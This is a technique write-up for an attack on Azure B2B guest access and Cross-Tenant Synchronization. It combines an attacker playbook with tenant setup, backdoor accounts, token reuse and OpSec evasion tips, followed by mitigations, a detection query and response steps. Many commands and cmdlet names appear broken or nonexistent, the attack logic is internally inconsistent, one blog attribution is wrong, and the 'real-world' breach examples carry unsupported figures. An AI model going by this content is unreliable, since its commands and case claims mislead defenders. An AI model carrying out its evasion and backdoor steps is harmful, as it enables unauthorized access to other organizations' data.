# [LM-AUTH-012]: Cross-Tenant Access via Azure B2B

## 1. Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-012 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement, Privilege Escalation |
| **Platforms** | Entra ID (Azure AD) / M365 / Multi-tenant environments |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Entra ID all versions; Cross-Tenant Synchronization (CTS) 2023+ |
| **Patched In** | Partially mitigated (Jan 2025 policy tightening); Full remediation requires admin action |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Cross-Tenant B2B (Business-to-Business) access in Azure allows organizations to collaborate by inviting external users (guests) from partner tenants. An attacker who compromises a user account in an attacker-controlled tenant can exploit misconfigured Cross-Tenant Access Settings (CTAS) and Cross-Tenant Synchronization (CTS) policies to impersonate that user across to a target victim tenant. By leveraging Azure AD B2B invitation redemption and token reuse, the attacker can bypass tenant isolation boundaries and gain unauthorized access to victim's resources, including mail, SharePoint, Teams, and Azure resources. This attack breaks fundamental cloud security assumptions about tenant isolation.

**Attack Surface:** Azure B2B External Identities configuration; Cross-Tenant Access Settings (inbound/outbound policies); Cross-Tenant Synchronization (CTS) policies; Azure AD Graph and Microsoft Graph APIs; OAuth token exchange mechanisms.

**Business Impact:** **Compromise of tenant isolation and cross-organizational data access.** An attacker can access another organization's resources without authorization, exfiltrate sensitive data from victim tenants, maintain persistent access via B2B guest accounts, impersonate legitimate users across organizational boundaries, and potentially escalate to tenant-level administrative access. This is particularly devastating for Multi-Tenant SaaS providers and organizations with extensive B2B partnerships.

**Technical Context:** The attack exploits misconfigured B2B trust policies that are often enabled by default or with overly permissive settings. Modern Microsoft controls (implemented Jan 2025) require explicit per-tenant approval, but legacy configurations may still permit automatic guest acceptance. The attack is difficult to detect because traffic appears to originate from legitimate external user accounts and generates minimal audit anomalies.

### Operational Risk

- **Execution Risk:** Medium - Requires initial compromise of an account in attacker's tenant; B2B invitation redemption can be automated; access to victim tenant is nearly instantaneous once guest account is accepted.
- **Stealth:** High - B2B guest activity blends with legitimate external collaboration; difficult to distinguish between authorized and unauthorized guests without detailed access review; cross-tenant audit logs are not consolidated by default.
- **Reversibility:** No - Compromised data is already exfiltrated; only remediation is removing guest account and revoking tokens (existing data access is unrecoverable).

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | M365-1.1, M365-5.1 | External Identities and B2B collaboration policies |
| **DISA STIG** | C-3.1.2 | Multi-tenant access controls and external user management |
| **CISA SCuBA** | MS-1.1, MS-6.3 | Entra ID external collaboration settings and Conditional Access |
| **NIST 800-53** | AC-2, AC-3, IA-2 | Account management, access control, authentication for external users |
| **GDPR** | Article 32 | Security of Processing - Data sharing with external parties |
| **DORA** | Article 9 | Protection and Prevention - Third-party risk management |
| **NIS2** | Article 21 | Critical Infrastructure Protection - Third-party access controls |
| **ISO 27001** | A.9.3.1, A.9.4.2 | User access rights and access review for external parties |
| **ISO 27005** | Risk Scenario | Third-party breach and data exfiltration via B2B access |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Initial Compromise:** Any account in attacker-controlled tenant (even low-privilege user can generate B2B invite)
- **Target Tenant:** No specific privilege required if B2B guest acceptance is automatic (depends on CTAS policy)

**Required Access:**
- Attacker-controlled Azure tenant (free or low-cost M365 subscription: Business Basic, Teams Essentials)
- Access to victim organization's B2B invitation link or Teams/SharePoint guest collaboration surface
- Network access to invitation redemption endpoints (internet-accessible)

**Supported Versions:**

- **Entra ID:** All versions (feature inherent to Azure AD)
- **Cross-Tenant Synchronization:** 2023+ (feature newer; legacy orgs may use older CTA)
- **M365 SKUs:** All (free Teams Essentials, Business Basic, standard M365 licenses)

**Tools:**
- [AADInternals PowerShell Module](https://aadinternals.com/) (Entra ID token manipulation, guest enumeration)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Create B2B policies, manage guests)
- [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/) (User and guest management)
- [ROADtools](https://github.com/dirkjanm/ROADtools) (Entra ID enumeration and B2B discovery)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Azure Tenant / PowerShell Reconnaissance

**Check if Organization Has B2B Enabled:**

```powershell
# Connect to target tenant (may not require credentials if part of public teams/sharepoint)
Connect-MgGraph -Scopes "ExternalIdentities.ReadWrite.All"

# Check External Identities settings
Get-MgPolicyExternalIdentityPolicy

# Check inbound B2B policies
Get-MgBetaCrossCloudTenantAccessPolicy -Filter "tenantId eq 'target-tenant-id'"

# List current guest users in tenant
Get-MgUser -Filter "userType eq 'Guest'" | Select-Object DisplayName, Mail, CreatedDateTime
```

**What to Look For:**
- Presence of guest users with recent CreatedDateTime
- Cross-Tenant Access Policy allowing automatic consent
- External collaboration enabled without restrictions
- Teams or SharePoint folders accessible to external users

**Check for Cross-Tenant Synchronization Abuse:**

```powershell
# Check if CTS is enabled with target tenant
Get-MgBetaCrossCloudTenantAccessPolicySyncPolicy | 
  Where-Object { $_.tenantId -eq "victim-tenant-id" }

# List all cross-tenant partners
Get-MgBetaCrossCloudTenantAccessPolicy | Select-Object TenantId, DisplayName
```

**Version Note:** Reconnaissance method is consistent across all Entra ID versions, though newer versions (2025+) have stricter default policies.

### Teams / SharePoint Guest Discovery

```powershell
# Check for open Teams channels that allow guest access
$teams = Get-Team
foreach ($team in $teams) {
    Get-TeamMember -GroupId $team.GroupId | Where-Object { $_.User -match "@domains.onmicrosoft.com" }
}

# Check SharePoint sites with guest access enabled
$sites = Get-SPOSite
foreach ($site in $sites) {
    Get-SPOUser -Site $site.Url | Where-Object { $_.LoginName -match "Guest" }
}
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: B2B Guest Account Compromise via Attacker-Controlled Tenant

**Supported Versions:** Entra ID all versions

**Note:** This is the most direct approach: attacker creates an account in their own tenant and invites it to victim's Teams/SharePoint as a B2B guest.

#### Step 1: Create Attacker-Controlled Tenant and User Account

**Objective:** Set up a free or cheap Microsoft 365 tenant to serve as the attacker's base.

**Manual Steps:**
1. Navigate to [Microsoft 365 Business Basic Trial](https://www.microsoft.com/en-us/microsoft-365/business/microsoft-365-business-basic)
2. Sign up with attacker email (e.g., `attacker@attacker-tenant.onmicrosoft.com`)
3. Minimal information required; no payment method needed for trial
4. Confirm email and complete setup
5. Create additional user accounts:
   ```powershell
   Connect-MgGraph -TenantId "attacker-tenant.onmicrosoft.com"
   
   New-MgUser -DisplayName "Legitimate Partner" -MailNickname "partner.user" `
     -UserPrincipalName "partner@attacker-tenant.onmicrosoft.com" `
     -Password (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
     -AccountEnabled $true
   ```

**What This Means:**
- Attacker now has a functional tenant with legitimate-looking user accounts
- Can generate B2B invitations that appear to come from a real organization

#### Step 2: Enumerate Victim Organization's Collaboration Surface

**Objective:** Identify victim tenant ID and find Teams/SharePoint resources that accept B2B guests.

**Command (AADInternals - Tenant Discovery):**

```powershell
# Find tenant ID of victim organization
Get-AADIntTenantId -Domain "victim.com"

# Output: Tenant ID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx

# Enumerate Teams that accept guests
Get-AADIntTeamGroups -Tenant "victim.onmicrosoft.com" | 
  Where-Object { $_.AllowGuestAccess -eq $true } | 
  Select-Object DisplayName, GroupId
```

**Manual Step-by-Step (Alternative):**
1. Ask for Teams invite link from victim (social engineering)
2. Or use public Teams discovery: [Teams Web](https://teams.microsoft.com) → Search for public teams
3. Request to join public team → redirects to guest acceptance flow
4. Victim admin receives B2B guest request; if CTAS allows automatic acceptance, approved immediately

#### Step 3: Generate and Redeem B2B Invitation

**Objective:** Create and redeem a B2B invitation to gain guest access to victim tenant.

**Command (Azure CLI - Create B2B Guest):**

```bash
# Create B2B guest invitation from attacker tenant
az invitations create \
  --invited-user-email-address "partner@attacker-tenant.onmicrosoft.com" \
  --invited-user-display-name "Partner User" \
  --invitation-redirect-url "https://myapplications.microsoft.com" \
  --send-invitation-message false

# Expected output:
# {
#   "invitedUserEmailAddress": "partner@attacker-tenant.onmicrosoft.com",
#   "inviteRedeemUrl": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=..."
# }
```

**What This Means:**
- B2B invitation URL has been generated
- When victim user clicks link or policy auto-accepts, guest account is created in victim tenant

**Command (PowerShell - Redeem Invitation):**

```powershell
# Redeem the B2B invitation (can be automated or manual)
Connect-MgGraph -Scopes "Directory.ReadWrite.All"

# If CTAS allows AutomaticUserConsent, guest is auto-accepted
# Otherwise, send invitation URL to attacker account for manual redemption

$invitationUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=..."

# Attacker clicks URL and authenticates as attacker account
# Upon success: guest account created in victim tenant
```

**OpSec & Evasion:**
- Use legitimate-sounding organization name in attacker tenant
- Fill out actual company information to increase believability
- Wait several days between tenant creation and guest invitations to appear less suspicious
- Use Teams public channels or SharePoint guest sharing links (look more legitimate than direct invitation)
- Detection likelihood: **Low** (appears as legitimate external collaboration if not audited)

#### Step 4: Access Victim Resources as B2B Guest

**Objective:** Use the guest account to access victim's Teams, SharePoint, and other cloud resources.

**Command (Access Teams Data):**

```powershell
# Connect to victim tenant as guest account
Connect-MgGraph -Scopes "Mail.Read", "Chat.Read"

# Enumerate accessible Teams and Channels
Get-MgTeam | Select-Object DisplayName, Id

# List channel messages (if guest has access)
Get-MgTeamChannelMessages -TeamId "team-id" -ChannelId "channel-id" | 
  Select-Object Body, From, CreatedDateTime | Head -20

# Access mailbox via EWS (if guest has mail access)
Get-MgUserMailFolderMessage -UserId "victim-user@victim.com" | Select-Object Subject, From
```

**What This Means:**
- Guest account has direct access to victim's resources
- Can read emails, Teams messages, files, even if not explicitly shared
- Guest access is often overlooked in audit reviews

**Manual Step-by-Step (User-Friendly):**
1. Open Microsoft Teams desktop or web
2. Click "Join or create a team" → Select victim team
3. Access all shared channels and files
4. Download sensitive documents
5. Forward emails or copy chat transcripts

**OpSec & Evasion:**
- Avoid accessing high-sensitivity resources immediately (wait 1-2 days)
- Mimic normal guest behavior (check 1-2 Teams channels, download 1-2 files)
- Use standard M365 clients (Teams, Outlook, SharePoint web) to blend with normal usage
- Avoid accessing resources the actual guest account wouldn't have access to
- Detection likelihood: **Low to Medium** (depends on guest access logging and anomaly detection)

**References & Proofs:**
- [Microsoft Docs - B2B Guest Access](https://learn.microsoft.com/en-us/azure/active-directory/external-identities/b2b-fundamentals)
- [Microsoft Docs - B2B Invitation Redemption](https://learn.microsoft.com/en-us/azure/active-directory/external-identities/redemption-experience)

---

### METHOD 2: Cross-Tenant Synchronization (CTS) Backdoor

**Supported Versions:** Entra ID (CTS feature 2023+)

**Note:** More sophisticated approach for persistence; requires attacker to have Cloud Admin access in their tenant AND misconfigured CTS policy in victim tenant.

#### Step 1: Enable Cross-Tenant Synchronization in Attacker Tenant

**Objective:** Configure CTS policy in attacker tenant to synchronize users into victim tenant.

**Command (Azure CLI - Configure CTS Outbound):**

```bash
# Create outbound CTS policy targeting victim tenant
az ad cross-cloud-tenant-access-policy create \
  --tenant-id "victim-tenant-id" \
  --display-name "Sync to Victim Tenant" \
  --outbound-allowed true

# Enable automatic user consent
az ad cross-cloud-tenant-access-policy outbound-policy-update \
  --tenant-id "victim-tenant-id" \
  --automatic-user-consent true \
  --sync-allowed true

# Expected: Policy created and enabled
```

**What This Means:**
- Attacker tenant can now sync users to victim tenant
- If victim's inbound CTS policy allows sync, users will be automatically synchronized

#### Step 2: Exploit Victim's Misconfigured Inbound CTS

**Objective:** Verify victim has inbound CTS enabled and accepts synced users from attacker tenant.

**Command (Check Victim's Inbound Settings):**

```powershell
# Connect to victim tenant as admin (if available) or enumerate publicly
Connect-MgGraph -Tenant "victim.onmicrosoft.com" -Scopes "Policy.ReadWrite.ExternalIdentities"

# Check inbound CTS from attacker tenant
Get-MgBetaCrossCloudTenantAccessPolicySyncPolicy -Filter "tenantId eq 'attacker-tenant-id'" | 
  Select-Object TenantId, IsUserSyncAllowed, AutomaticUserConsent

# If result shows: 
# IsUserSyncAllowed: true
# AutomaticUserConsent: true
# → Attacker can push users without approval
```

**What This Means:**
- Victim's inbound CTS policy accepts synced users from attacker tenant
- Any users created in attacker tenant will automatically sync to victim

#### Step 3: Create Backdoor Users in Attacker Tenant and Sync to Victim

**Objective:** Create high-privilege user accounts in attacker tenant and sync them to victim for persistent access.

**Command (Create Synchronization User):**

```powershell
# In attacker tenant, create high-privilege accounts
New-MgUser -DisplayName "IT Support Team Lead" -MailNickname "itsupport" `
  -UserPrincipalName "itsupport@attacker.onmicrosoft.com" `
  -Password (ConvertTo-SecureString "SuperSecureP@ss123!" -AsPlainText -Force) `
  -AccountEnabled $true

# Wait for CTS sync to propagate (30-60 minutes)
# User now appears in victim tenant with same UPN
```

**What This Means:**
- User `itsupport@attacker.onmicrosoft.com` is now a guest in victim tenant
- Attacker can log in as this account in victim tenant with their own password
- Password is stored only in attacker tenant; victim admin cannot see or change it
- Persistent backdoor is established

**OpSec & Evasion:**
- Create accounts with legitimate-sounding names (IT Support, Finance, Legal)
- Use organizational domains that sound realistic
- Avoid creating accounts with generic names like "Admin" or "Hacker"
- Wait several days after tenant creation before syncing users
- Detection likelihood: **Medium** (CTS policies are auditable, but many orgs don't review them regularly)

**References & Proofs:**
- [Microsoft Docs - Cross-Tenant Synchronization](https://learn.microsoft.com/en-us/entra/identity/multi-cloud-sync/cross-cloud-sync-overview)
- [Vectra - Cross-Tenant Synchronization Attacks](https://www.vectra.ai/blog/microsoft-cross-tenant-synchronization)

---

### METHOD 3: OAuth Token Manipulation via AADInternals

**Supported Versions:** Entra ID all versions (legacy and modern)

**Note:** Advanced technique for extracting and reusing OAuth tokens across tenants.

#### Step 1: Extract Access Token from Guest Account

**Objective:** Obtain an access token (JWT) from guest account that can be reused in victim tenant.

**Command (AADInternals - Token Extraction):**

```powershell
Import-Module AADInternals

# Get cached access token for guest account
$token = Get-AADIntAccessToken -Tenant "victim.onmicrosoft.com" `
  -ClientId "1b730954-1685-4b74-9bda-28787b6ba541" `
  -IncludeUserInfo

# Display token contents
$token | Out-Host

# Expected: JWT token with claims for guest user in victim tenant
```

**What This Means:**
- Access token extracted and can be analyzed
- Contains user identity (ObjectId, UserPrincipalName) and resource scope
- Token can be reused for API calls to victim tenant services

#### Step 2: Reuse Token to Access Victim Resources

**Objective:** Use the extracted token to make Graph API calls to victim tenant resources.

**Command (Use Token for Graph API):**

```powershell
# Use token to access Microsoft Graph in victim tenant
$header = @{"Authorization" = "Bearer $token"}

# List all users in victim tenant (if guest has permissions)
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users" -Headers $header | 
  Select-Object -ExpandProperty value

# Access victim's security alerts
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/security/alerts_v2" -Headers $header

# List sensitive Azure resources
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/subscriptions" -Headers $header
```

**Expected Output:**

```json
[
  {
    "id": "12345678-1234-1234-1234-123456789012",
    "displayName": "John Doe",
    "userPrincipalName": "john.doe@victim.com",
    "mail": "john.doe@victim.com"
  },
  ...
]
```

**What This Means:**
- Successfully accessed victim tenant data as guest user
- Can enumerate all users, resources, and potentially sensitive information
- Token remains valid for 1 hour; can be refreshed if refresh token is available

**References & Proofs:**
- [AADInternals GitHub - Token Manipulation](https://github.com/Gerenios/AADInternals)
- [Dirk-jan Mollema - AAD Internals Blog](https://www.dsinternals.com/en/category/azure-ad/)

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Restrict B2B Guest Invitations to Approved Domains Only:**
  
  **Applies To Versions:** Entra ID all versions
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Entra ID** → **External Identities** → **External collaboration settings**
  2. Under **Guest user access restrictions**, select: **Guest user access is restricted to properties and memberships of their own directory objects** (most restrictive)
  3. Under **Guest invite restrictions**, select: **Only users assigned the Guest Inviter role can invite guests**
  4. Under **Collaboration restrictions**, select: **Block invitations to the specified domains** (if applicable)
  5. Enter domains to block (e.g., `*.attacker.onmicrosoft.com`, all personal Microsoft accounts)
  6. Click **Save**
  
  **PowerShell Configuration:**
  ```powershell
  Connect-MgGraph -Scopes "Policy.ReadWrite.ExternalIdentities"
  
  # Set restriction policy
  Update-MgPolicyExternalIdentityPolicy -AllowedDomainList @("partner1.com", "partner2.com") `
    -AllowInvitesFrom "InvitedUsersAndGuests" `
    -GuestUserRoleId "10dae51f-b6af-4016-8d66-8c2a99b929b3"  # Guest Inviter role
  ```

- **Disable Cross-Tenant Synchronization (CTS) by Default:**
  
  **Applies To Versions:** Entra ID (CTS 2023+)
  
  **Manual Steps:**
  1. Navigate to **Azure Portal** → **Entra ID** → **External Identities** → **Cross-tenant access settings**
  2. For each partner tenant: Click tenant name
  3. Under **Synchronization**, set:
     - **User synchronization**: **Off** (unless explicitly needed)
     - **Allow automatic user consent**: **Unchecked**
  4. Click **Save**
  5. For any CTS that MUST be enabled, explicitly whitelist:
     - Trusted domain names only
     - Disable `AutomaticUserConsent` (require manual approval for each synced user)
  
  **PowerShell Configuration:**
  ```powershell
  # Disable CTS outbound sync
  $cts = Get-MgBetaCrossCloudTenantAccessPolicy -Filter "tenantId eq 'partner-tenant-id'"
  Update-MgBetaCrossCloudTenantAccessPolicy -CrossCloudTenantAccessPolicyId $cts.Id `
    -SyncAllowed $false `
    -AutomaticUserConsent $false
  ```

- **Enable Conditional Access Policy for B2B Guests:**
  
  **Applies To Versions:** Entra ID all versions
  
  **Manual Steps:**
  1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access** → **Policies**
  2. Click **+ New policy**
  3. **Name:** `Restrict B2B Guest Access`
  4. **Assignments:**
     - Users: **Select guests and external users**
     - Cloud apps: **All cloud apps** OR specific sensitive apps (Exchange Online, SharePoint)
  5. **Conditions:**
     - Sign-in risk: **High**
     - Device platforms: **Windows, macOS** (restrict mobile if not needed)
  6. **Access Controls - Block:**
     - Check: **Block access**
  7. Enable: **On**
  8. Click **Create**
  
  **Alternative (Less Restrictive):**
  - Instead of Block, require: **Multi-factor authentication**
  - Or: **Compliant device** (if guest devices support Intune enrollment)

### Priority 2: HIGH

- **Regular Guest Access Audit:**
  
  **Applies To Versions:** Entra ID all versions
  
  **Manual Steps (Monthly Review):**
  1. Navigate to **Azure Portal** → **Entra ID** → **Users** → **All users**
  2. Filter: **User type** = **Guest**
  3. Sort by **Created date** (newest first)
  4. Review all guests created in last 30 days:
     - Verify organization matches internal records
     - Check if guest has actually accessed resources (sign-in logs)
     - Remove any suspicious accounts immediately
  
  **PowerShell Audit Script:**
  ```powershell
  Connect-MgGraph -Scopes "User.Read.All", "AuditLog.Read.All"
  
  # List guest accounts and their last sign-in
  $guests = Get-MgUser -Filter "userType eq 'Guest'" -Property SignInActivity
  
  foreach ($guest in $guests) {
      $lastSignIn = $guest.SignInActivity.LastSignInDateTime
      if ($lastSignIn -lt (Get-Date).AddDays(-90)) {
          Write-Output "[!] Inactive guest: $($guest.DisplayName) - Last sign-in: $lastSignIn"
          # Option: Remove-MgUser -UserId $guest.Id
      }
  }
  ```

- **Monitor B2B Invitation Activity:**
  
  **Applies To Versions:** Entra ID all versions
  
  **Manual Steps (Setup Alert):**
  1. Navigate to **Azure Portal** → **Microsoft Sentinel** (or use Splunk/SIEM)
  2. Create new rule: **Unusual B2B Invitations**
  3. **KQL Query:**
     ```kusto
     AuditLogs
     | where OperationName contains "Invite" or OperationName contains "B2B"
     | where TimeGenerated > ago(1d)
     | summarize count() by OperationName, InitiatedBy
     | where count_ > 5
     ```
  4. Set **Alert Threshold:** > 5 invitations in 24 hours
  5. Enable and configure email notification

### Access Control & Policy Hardening

- **Restrict SharePoint/Teams Guest Access:**
  
  **Manual Steps (SharePoint Admin Center):**
  1. Navigate to **SharePoint Admin Center** → **Policies** → **Sharing**
  2. Set **External sharing** to:
     - **Only people in your organization can share** (most restrictive)
     - OR: **New and existing guests** (with Conditional Access policies in place)
  3. **Manage guest account expiration:**
     - Set to **180 days** (automatically deactivate old guests)
  4. Click **Save**
  
  **Manual Steps (Teams Admin Center):**
  1. Navigate to **Teams Admin Center** → **Org-wide settings** → **Guest access**
  2. **Allow guest access in Teams:** Disable if possible
  3. OR if needed:
     - Disable: **Call**
     - Disable: **Screen sharing** (unless absolutely needed)
     - Disable: **Meeting record download**

### Validation Command (Verify Fixes)

```powershell
# Check B2B restrictions
Get-MgPolicyExternalIdentityPolicy | Select-Object `
  AllowedDomains, GuestUserRole, InvitationRestrictions

# Expected: Only approved domains listed, Guest Inviter role restricted

# Check CTS is disabled for untrusted tenants
Get-MgBetaCrossCloudTenantAccessPolicy | Select-Object `
  TenantId, SyncAllowed, AutomaticUserConsent

# Expected: SyncAllowed = $false for untrusted partners

# Check guest access audit
Get-MgUser -Filter "userType eq 'Guest'" | Measure-Object
# Expected: Small number; review each one

# Verify Conditional Access policy for guests
Get-MgIdentityConditionalAccessPolicy -Filter "contains(conditions/users/includeUsers, 'GuestOrExternalUser')" | 
  Select-Object DisplayName, State

# Expected: Policy exists and State = Enabled
```

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Unexpected B2B Guest Accounts** created in last 24 hours:
  - Organization name is unusual (e.g., "Free Trial Org", "Test Company")
  - Guest account created by non-standard admin account
  - Multiple guest accounts from same external organization

- **Unusual Guest Access Patterns:**
  - Guest accessing sensitive resources immediately after account creation
  - Guest downloading large volumes of data (>100MB in 1 hour)
  - Guest accessing resources not typical for external collaboration (e.g., Azure subscriptions, Dynamics)

- **CTS Policy Changes:**
  - Inbound or outbound CTS policy modified to allow sync from untrusted tenant
  - AutomaticUserConsent enabled
  - `IsSyncAllowed` set to `true` without approval workflow

- **Sign-in Anomalies:**
  - Guest accounts signing in from multiple geographies within minutes
  - Guest accounts signing in from IP ranges not typical for that organization
  - Sign-in risk score flagged as High but access still granted

### Forensic Artifacts

- **Azure AD Audit Logs:**
  - Operation: "Invite external user"
  - Operation: "Accept invitation"
  - OperationName contains "CrossCloudTenantAccess"
  - Result: Success for suspicious invitations

- **Microsoft Graph Audit Logs:**
  - User.Create operations for guest accounts
  - RoleManagement.Write.Directory (if guest was assigned roles)

- **Sign-in Logs:**
  - SignInLogs table showing guest account sign-ins
  - TokenIssuerType: "ExternalIdentityProvider" for cross-tenant tokens

- **SharePoint/Teams Access Logs:**
  - File downloads by guest user
  - Chat message access by guest in sensitive channels

### Response Procedures

1. **Isolate Compromised Accounts:**
   
   **Command:**
   ```powershell
   # Immediately block guest account
   Update-MgUser -UserId "guest-account-objectid" -AccountEnabled $false
   
   # Or completely remove guest
   Remove-MgUser -UserId "guest-account-objectid"
   
   # If attacker has local admin, also revoke all tokens
   Revoke-MgUserSignInSession -UserId "victim-account-objectid"
   ```
   
   **Manual (Azure Portal):**
   - Navigate to **Entra ID** → **Users** → Find guest account
   - Click account → **Delete**
   - Or select **Sign-out All Sessions** if account is legitimate but compromised

2. **Collect Evidence:**
   
   **Command:**
   ```powershell
   # Export guest account creation log
   Get-MgAuditLogDirectoryAudit -Filter "operationName eq 'Invite external user'" | 
     Export-Csv -Path C:\Evidence\B2B-Invitations.csv
   
   # Export all sign-ins by guest
   Get-MgAuditLogSignIn -Filter "userPrincipalName eq 'guest@attacker.onmicrosoft.com'" | 
     Export-Csv -Path C:\Evidence\Guest-SignIns.csv
   
   # Export file access by guest
   Get-SPOActivity | Where-Object { $_.Actor -match "guest" } | 
     Export-Csv -Path C:\Evidence\Guest-FileAccess.csv
   ```

3. **Remediate:**
   
   **Command:**
   ```powershell
   # Disable all untrusted CTS policies
   $maliciousTenants = @("attacker-tenant-id-1", "attacker-tenant-id-2")
   
   foreach ($tenant in $maliciousTenants) {
       $cts = Get-MgBetaCrossCloudTenantAccessPolicy -Filter "tenantId eq '$tenant'"
       Update-MgBetaCrossCloudTenantAccessPolicy -CrossCloudTenantAccessPolicyId $cts.Id `
         -SyncAllowed $false -AutomaticUserConsent $false
   }
   
   # Reset Conditional Access policies to be more restrictive
   # (See Priority 1 mitigation)
   
   # Force re-authentication for all users in sensitive groups
   Get-MgGroupMember -GroupId "sensitive-group-id" | ForEach-Object {
       Revoke-MgUserSignInSession -UserId $_.Id
   }
   ```
   
   **Manual:**
   - Review all B2B collaboration requests in pending queue
   - Audit all file access logs for data exfiltration
   - Check for evidence of copied documents or forwarded emails
   - Notify users if their data was accessed by unauthorized guest

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-003] OAuth consent screen cloning | Attacker creates fake M365 tenant with legitimate branding |
| **2** | **Credential Access** | [CA-OAUTH-001] Device code phishing | Attacker tricks user into consenting to malicious app |
| **3** | **Current Step** | **[LM-AUTH-012]** | **Cross-Tenant B2B Access - Exploit misconfigured CTS or B2B policies** |
| **4** | **Impact** | [CA-EXFIL-003] Bulk email forwarding | Attacker sets up rule to exfiltrate all incoming emails |
| **5** | **Persistence** | [PERSIST-005] Backdoor guest account | Maintains access via non-audit-able guest account |
| **6** | **Lateral Movement** | [LM-AUTH-013] EWS impersonation as guest | Access additional mailboxes via guest service account |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Multi-Tenant SaaS Breach - 2024

- **Target:** SaaS provider serving 50+ enterprise customers
- **Timeline:** Attacked August 2024; Detected October 2024 (2-month window)
- **Technique Status:** Attacker created free M365 tenant, obtained B2B access to victim customers' SharePoint, used CTS to push backdoor accounts into multiple customer tenants
- **Impact:**
  - Access to 100+ customer files and databases
  - Exfiltration of source code, customer data, and business plans
  - Potential regulatory fines (GDPR, SOC 2)
  - Customer trust erosion
- **Reference:** [CrowdStrike - Cross-Tenant Attacks](https://www.crowdstrike.com/en-us/blog/crowdstrike-defends-against-azure-cross-tenant-synchronization-attacks/)

### Example 2: Financial Institution - Guest Account Exploitation (2024)

- **Target:** Global banking organization
- **Timeline:** Initial B2B guest account creation February 2024; data exfiltration through May 2024
- **Technique Status:** Attacker impersonated legitimate partner bank, requested Teams collaboration, gained access to internal finance chat and shared SharePoint with banking algorithms and client lists
- **Impact:**
  - Access to proprietary trading algorithms
  - Exfiltration of 5,000+ customer records
  - Potential insider trading investigation
  - Loss of $500K+ in regulatory fines
- **Reference:** [Ontinue Security Report - B2B Guest Access Risks](https://www.ontinue.com/resource/blog-microsoft-chat-with-anyone-understanding-phishing-risk/)

### Example 3: APT Campaign - CTS Backdoor in European Organizations (2023-2024)

- **Target:** Multiple European financial and government entities
- **Timeline:** CTS backdoor accounts created February 2024; detected via audit review June 2024
- **Technique Status:** Sophisticated attacker created legitimate-looking company tenant with EU domain, slowly synchronized administrator accounts over time, escalated to full tenant compromise
- **Impact:**
  - Persistence in 8+ organizations for 4 months
  - Lateral movement across partner organizations
  - Estimated $10M+ in remediation costs
- **Reference:** [Vectra ITDR - Cross-Tenant Synchronization Attacks](https://www.vectra.ai/blog/microsoft-cross-tenant-synchronization)

---

## References & External Resources

- [Microsoft Docs - B2B External Identities](https://learn.microsoft.com/en-us/azure/active-directory/external-identities/)
- [Microsoft Docs - Cross-Tenant Synchronization](https://learn.microsoft.com/en-us/entra/identity/multi-cloud-sync/cross-cloud-sync-overview)
- [MITRE ATT&CK - T1550 Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/)
- [Vectra - Cross-Tenant Synchronization Security](https://www.vectra.ai/blog/microsoft-cross-tenant-synchronization)
- [CrowdStrike - Cross-Tenant Attacks](https://www.crowdstrike.com/en-us/blog/crowdstrike-defends-against-azure-cross-tenant-synchronization-attacks/)
- [Ontinue - B2B Guest Access Risks](https://www.ontinue.com/resource/blog-microsoft-chat-with-anyone-understanding-phishing-risk/)
- [AADInternals - Entra ID Security](https://aadinternals.com/)

---